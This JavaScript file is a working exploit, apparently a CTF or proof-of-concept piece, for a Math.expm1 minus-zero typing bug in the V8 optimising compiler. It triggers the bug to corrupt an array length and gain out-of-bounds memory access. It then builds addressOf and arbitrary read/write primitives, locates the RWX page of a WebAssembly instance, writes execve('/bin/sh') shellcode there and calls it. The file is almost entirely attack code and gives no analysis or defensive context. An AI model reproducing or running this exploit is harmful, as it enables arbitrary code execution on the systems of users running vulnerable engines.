// Auxiliary Functions/*
/*let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function() {
    return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function() {
    int_view[0] = this;
    return float_view[0];
}
BigInt.prototype.smi2f = function() {
    int_view[0] = this << 32n;
    return float_view[0];
}
Number.prototype.f2i = function() {
    float_view[0] = this;
    return int_view[0];
}
Number.prototype.f2smi = function() {
    float_view[0] = this;
    return int_view[0] >> 32n;
}
Number.prototype.i2f = function() {
    return BigInt(this).i2f();
}
Number.prototype.smi2f = function() {
    return BigInt(this).smi2f();
}
*/
class typeConvert{
	constructor(){
		this.buf = new ArrayBuffer(8);
		this.f64 = new Float64Array(this.buf);
		this.u32 = new Uint32Array(this.buf);
		this.bytes = new Uint8Array(this.buf);
    }
    //convert float to int
	f2i(val){
		this.f64[0] = val;
		let tmp = Array.from(this.u32);
		return tmp[1] * 0x100000000 + tmp[0];
    }

    /*convert int to float
    if nead convert a 64bits int to float
    please use string like "deadbeefdeadbeef"
    (v8's SMI just use 56bits, lowest 8bits is zero as flag)
    */
    i2f(val){
        let vall = hex(val);
		let tmp = [];
        tmp[0] = vall.slice(10, );
        tmp[1] = vall.slice(2, 10);
        tmp[0] = parseInt(tmp[0], 16);
        // console.log(hex(val));
		tmp[1] = parseInt(tmp[1], 16);
		this.u32.set(tmp);
		return this.f64[0];
	}
}
//convert number to hex string
function hex(x)
{
    return '0x' + (x.toString(16)).padStart(16, 0);
}

var dt = new typeConvert();

console.log("math.expm1 exp");

const NUM_LOOPS_FOR_OPTIM = 10000; // Change this if it is not optimizing

function _auxiliary_(minusZero, isstring) {
    let aux_x = minusZero ? -0 : (isstring ? "0" : 0);
    let aux_a = {aux_z : Math.expm1(aux_x), aux_y : -0};
    aux_a.aux_y = Object.is(aux_a.aux_z, aux_a.aux_y);
    return aux_a.aux_y;
}

let oob_buffer = undefined;
let oob_buffer_unpacked = undefined;
let oob_buffer_packed = undefined;


function trigger(minusZero, isstring) {
    // The arrays we shall target
    let a = [0.1, 0.1, 0.1, 0.1, 0.1, 0.1];
    let b = [1.1, 1.2, 1.3, 1.4, 1.5]
    let c = [{}, 2.2, 2.3, 2.4, 2.5, 2.6, 2.7, 2.8];
    let d = [3.1, 3.2, 3.3, 3.4];

    // Trigger the actual bug
    let aux_a = { aux_z : 1.2 };
    aux_a.aux_z = _auxiliary_(minusZero, isstring);
    let i = aux_a.aux_z + 0;	// Real: 1, Feedback type: Range(0, 0)

    // Change `b.length` to 1024 * 1024
	    a[i * 16] =1.39064994160909e-309;

    // Expose OOB RW buffer to outside world, for stage 1
    oob_buffer = b;
    oob_buffer_unpacked = c;
    oob_buffer_packed = d;
console.log(i);
    return i == 0 ? 'untriggered' : a[i];
}

if (trigger(false, false) != 'untriggered') {
    throw "[FAIL] Unexpected return value in unoptimized trigger";
}
for (var zz = 0 ; zz < NUM_LOOPS_FOR_OPTIM ; ++zz) { trigger(false, false); }
    // %OptimizeFunctionOnNextCall(trigger);
if (trigger(false, true) != 'untriggered') {
    throw "[FAIL] Unexpected return value in first-level optimized trigger";
}
for (var zz = 0 ; zz < NUM_LOOPS_FOR_OPTIM ; ++zz) { trigger(false, false); }
    // %OptimizeFunctionOnNextCall(trigger);
if (trigger(true, true) == undefined) {
    throw "[FAIL] Unable to trigger bug"
}
if ( oob_buffer.length < 1024 ) {
    throw "[FAIL] Triggered bug, but didn't update length of OOB RW buffer";
}

var objLeak = {'leak' : 0x1234, 'tag' : 0xdead};
var objTest = {'a':'b'};
var offset1;
//search the objLeak.tag
for(let i=0; i<0xffff; i++){
    if(dt.f2i(oob_buffer[i]) == 0xdead00000000){
        offset1 = i-1; //a2[offset1] -> objLeak.leak
        break;
    }
}
console.log("offset1 is "+offset1);

function addressOf(target){
    objLeak.leak = target;
    let leak = dt.f2i(oob_buffer[offset1]);
    return leak;
}

var buf = new ArrayBuffer(0xbeef);
var offset2;
var dtView = new DataView(buf);

//search the buf.size
for(let i=0; i<0xffff; i++){
    if(dt.f2i(oob_buffer[i]) == 0xbeef){
        offset2 = i+1; //a2[offset2] -> buf.backing_store
        break;
    }
}
console.log("offset2 is "+offset2);
function write64(addr, value){
    oob_buffer[offset2] = dt.i2f(addr);
    dtView.setFloat64(0, dt.i2f(value), true);
}

function read64(addr, str=false){
    oob_buffer[offset2] = dt.i2f(addr);
    let tmp = ['', ''];
    let tmp2 = ['', ''];
    let result = ''
    tmp[1] = hex(dtView.getUint32(0)).slice(10,);
    tmp[0] = hex(dtView.getUint32(4)).slice(10,);
    for(let i=3; i>=0; i--){
        tmp2[0] += tmp[0].slice(i*2, i*2+2);
        tmp2[1] += tmp[1].slice(i*2, i*2+2);
    }
    result = tmp2[0]+tmp2[1]
    if(str==true){return '0x'+result}
    else {return parseInt(result, 16)};
}


/*-------------------------use wasm to execute shellcode------------------*/
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,
    127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,
    1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,
    0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,10,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var funcAsm = wasmInstance.exports.main;

var addressFasm = addressOf(funcAsm);
var sharedInfo = read64(addressFasm+0x18-0x1);
var data = read64(sharedInfo+0x8-0x1);
var instance = read64(data+0x10-0x1);
var memoryRWX = (read64(instance+0xe8-0x1));
memoryRWX = Math.floor(memoryRWX);

console.log("[*] Get RWX memory : " + hex(memoryRWX));
// sys_execve('/bin/sh')
 var shellcode = [
'2fbb485299583b6a',
'5368732f6e69622f',
'050f5e5457525f54'
];

//write shellcode into RWX memory
var offsetMem = 0;
for(x of shellcode){
    write64(memoryRWX+offsetMem, x);
	var aaa=read64(memoryRWX+offsetMem);


console.log("[*] Get RWX memory : " + hex(aaa));
    offsetMem+=8;
}

//call funcAsm() and it would execute shellcode actually
funcAsm();


